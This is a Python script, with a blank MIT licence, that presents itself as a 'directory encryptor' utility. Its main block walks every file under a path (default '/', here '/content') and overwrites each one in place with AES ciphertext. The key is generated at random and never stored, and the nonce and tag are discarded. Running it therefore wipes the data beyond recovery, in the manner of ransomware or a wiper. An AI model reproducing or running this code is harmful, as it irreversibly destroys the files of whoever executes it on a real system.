import os
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Function to install required packages
def install_required_packages():
    required_packages = ['pycryptodome']
    for package in required_packages:
        subprocess.call(['pip', 'install', package])

# License Agreement
LICENSE = """
Copyright (c) [Year] [Author]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

# Class for Directory Encryption
class DirectoryEncryptor:
    def __init__(self, path=None, key=None):
        if path is None:
            self.path = "/"
        else:
            self.path = path

        if key is None:
            # Generate a random 256-bit key if not provided
            self.key = get_random_bytes(32)
        else:
            self.key = key

    # Function to encrypt a file using AES encryption
    def encrypt_file_aes(self, input_file):
        try:
            with open(input_file, 'rb') as file:
                plaintext = file.read()

            cipher = AES.new(self.key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)

            with open(input_file, 'wb') as file:
                file.write(ciphertext)

            print(f"File '{input_file}' encrypted successfully!")
        except FileNotFoundError:
            print("File not found!")
        except Exception as e:
            print(f"Error occurred during encryption of '{input_file}':", str(e))

    # Function to list directories and encrypt files within them
    def list_directories(self, path=None):
        if path is None:
            path = self.path

        for root, _, files in os.walk(path):
            for file in files:
                input_file = os.path.join(root, file)
                self.encrypt_file_aes(input_file)

if __name__ == "__main__":
    # Install required packages
    install_required_packages()
    
    # Define directory path and generate random key
    directory_path = "/content"
    key = get_random_bytes(32)
    
    # Initialize DirectoryEncryptor object and encrypt files
    encryptor = DirectoryEncryptor(path=directory_path, key=key)
    encryptor.list_directories()
